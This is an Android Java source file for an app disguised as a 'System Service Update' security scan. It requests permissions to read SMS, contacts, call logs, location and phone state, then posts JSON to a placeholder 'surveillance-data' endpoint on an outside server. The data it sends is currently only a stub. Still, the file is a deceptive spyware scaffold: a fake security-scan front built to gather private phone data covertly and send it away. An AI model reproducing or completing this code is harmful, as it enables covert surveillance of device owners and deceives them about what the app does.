package com.security.update;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    private static final String SERVER_URL = "https://your-server.com/api/surveillance-data";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private TextView statusText;
    private Button startButton;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        statusText = findViewById(R.id.statusText);
        startButton = findViewById(R.id.startButton);
        startButton.setOnClickListener(v -> {
            if (checkPermissions()) {
                startDataCollection();
            } else {
                requestPermissions();
            }
        });
        statusText.setText("System Service Update Ready\nTap Start to begin security scan");
    }

    private boolean checkPermissions() {
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE
        };
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestPermissions() {
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE
        };
        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                startDataCollection();
            } else {
                statusText.setText("Permissions denied! Cannot perform security scan.");
            }
        }
    }

    private void startDataCollection() {
        statusText.setText("🔍 Starting Security Scan...");
        startButton.setEnabled(false);
        new Thread(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("device_id", "test_device");
                data.put("status", "scan_started");
                data.put("timestamp", System.currentTimeMillis());
                sendDataToServer(data);
                runOnUiThread(() -> {
                    statusText.setText("✅ Security Scan Complete!\nData sent to server.");
                });
            } catch (Exception e) {
                runOnUiThread(() -> {
                    statusText.setText("❌ Scan Failed: " + e.getMessage());
                    startButton.setEnabled(true);
                });
            }
        }).start();
    }

    private void sendDataToServer(JSONObject data) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            OutputStream os = conn.getOutputStream();
            os.write(data.toString().getBytes());
            os.flush();
            os.close();
            int responseCode = conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
